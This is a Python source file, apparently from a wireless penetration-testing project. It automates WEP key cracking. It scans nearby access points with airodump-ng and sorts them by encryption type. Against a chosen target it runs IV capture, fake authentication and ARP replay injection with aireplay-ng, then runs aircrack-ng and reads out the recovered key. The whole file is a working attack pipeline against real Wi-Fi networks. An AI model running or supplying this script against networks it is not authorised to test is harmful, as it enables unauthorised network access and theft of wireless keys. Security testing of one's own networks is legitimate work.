#!/usr/bin/env python3
import csv
import time
from subprocess import run, TimeoutExpired, DEVNULL, Popen, PIPE, STDOUT

from tests import Test
from tools import util


class Target:
    def __init__(self, fields):
        self.bssid = fields[0]
        self.channel = fields[3]
        self.encryption = fields[5]
        if 'WPA' in self.encryption:
            self.encryption = 'WPA'
        elif 'WEP' in self.encryption:
            self.encryption = 'WEP'
        self.power = int(fields[8])
        if self.power < 0:
            self.power += 100
        self.beacons = int(fields[9])
        self.ivs = int(fields[10])
        self.essid_len = int(fields[12])
        self.essid = fields[13]
        self.key = ''

    # Debug
    def __str__(self):
        return self.bssid + ' ' + self.channel + ' ' + self.encryption + ' ' + str(self.power) + ' ' + str(
            self.beacons) + ' ' + str(self.ivs) + ' ' + str(self.essid_len) + ' ' + self.essid


class Aircrack:
    targets = []
    targets_wep = []
    targets_wpa = []
    targets_others = []

    def __init__(self):
        self.path = Test.tmp_path + "airodump"
        self.filename = self.path + "-01.csv"
        self.raw_csv = ''
        run(["pkill", "air*"], stdout=DEVNULL, stderr=DEVNULL)

    def _parse(self):
        with open(self.filename, "r") as csvfile:
            reader = csv.reader(csvfile, skipinitialspace=True)
            for row in reader:
                if len(row) == 0: continue
                if 'BSSID' in row[0]: continue
                if 'Station MAC' in row[0]: break
                t = Target(row)
                Aircrack.targets.append(t)
                if t.encryption is 'WEP':
                    Aircrack.targets_wep.append(t)
                elif t.encryption is 'WPA':
                    Aircrack.targets_wpa.append(t)
                else:
                    Aircrack.targets_others.append(t)

    def scan(self):
        try:
            proc = run(["airodump-ng", "-w", self.path, "-o", "csv", Test.interface], stdout=DEVNULL,
                       stderr=DEVNULL, timeout=10)
        except TimeoutExpired as e:
            with open(self.filename, "r", newline='') as csvfile:
                self.raw_csv = csvfile.read()
            self._parse()
            return 0

    def capture_iv(self, target):
        # Capturing IVs
        self.target_ivs_file = self.path + util.remove_colon(target.bssid)
        airodump_iv = Popen(
            ["airodump-ng", "--bssid", target.bssid, "-w", self.target_ivs_file, "-o", "pcap", "-c", target.channel,
             Test.interface], stdout=DEVNULL, stderr=DEVNULL)
        return airodump_iv

    def fake_auth(self, target):
        # Performing fake authentication
        auth = Popen(["aireplay-ng", "-1", "0", "-a", target.bssid, Test.interface], stdout=DEVNULL, stderr=DEVNULL)
        return auth

    def arp_requesting(self, target):
        # ARP requesting in replay mode
        airodump_arp_req = Popen(
            ["aireplay-ng", "-3", "-b", target.bssid, Test.interface], stdout=DEVNULL, stderr=DEVNULL)
        return airodump_arp_req

    def crack_wep(self, target):
        # Cracking
        crack = Popen(["aircrack-ng", "-q", "-b", target.bssid, self.target_ivs_file + '-01.cap'], stdout=PIPE,
                      stderr=STDOUT)
        return crack

    def auto_crack_wep(self, target):
        capture = self.capture_iv(target)
        auth = self.fake_auth(target)
        arp = self.arp_requesting(target)
        time.sleep(10)
        crack = self.crack_wep(target)
        while crack.poll() is None:
            line = crack.stdout.readline().decode()
            if "KEY FOUND" in line:
                target.key = line[13:-4]
                capture.kill()
                auth.kill()
                arp.kill()
                crack.kill()
                return 0
            elif "Got no data packets" in line:
                return 3
